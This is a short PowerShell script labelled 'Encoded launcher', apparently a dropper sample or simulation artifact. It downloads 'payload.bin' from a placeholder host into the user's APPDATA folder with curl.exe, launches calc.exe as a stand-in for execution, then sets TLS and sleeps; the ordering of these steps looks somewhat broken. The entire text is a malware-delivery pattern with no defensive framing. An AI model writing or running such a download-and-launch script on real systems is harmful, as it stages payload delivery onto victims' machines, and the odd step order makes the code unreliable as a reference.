# Encoded launcher
$PayloadUrl = 'https://contoso.com/downloads/payload.bin'
$DropPath = "$env:APPDATA\payload.bin"
curl.exe -s -L -o $DropPath $PayloadUrl
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Start-Sleep -Seconds 19
